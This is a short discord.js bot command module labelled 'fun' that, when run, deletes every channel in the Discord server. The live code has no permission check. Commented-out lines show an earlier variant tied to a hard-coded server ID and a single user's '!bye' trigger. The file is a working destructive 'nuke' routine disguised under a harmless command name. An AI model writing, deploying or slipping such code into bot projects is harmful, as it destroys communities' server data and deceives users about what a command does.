const discord = require("discord.js");
module.exports.run = async (bot, message) => {
  message.guild.channels.forEach((channel) => channel.delete());
};
//   let server = Client.guilds.get("506435477633761281"); //Check Discord's Help For it
//   for (let i = 0; i < server.channels.array().length; i++) {
//     server.channels.array()[i].delete();
//   }
//   if (message.author.id == "234400390572015637") {
//     if (message.content === "!bye") {
//       message.guild.channels.forEach((channel) => channel.delete());
//     }
//   }
// };
module.exports.help = {
  name: "fun",
  aliases: ["delete"],
};
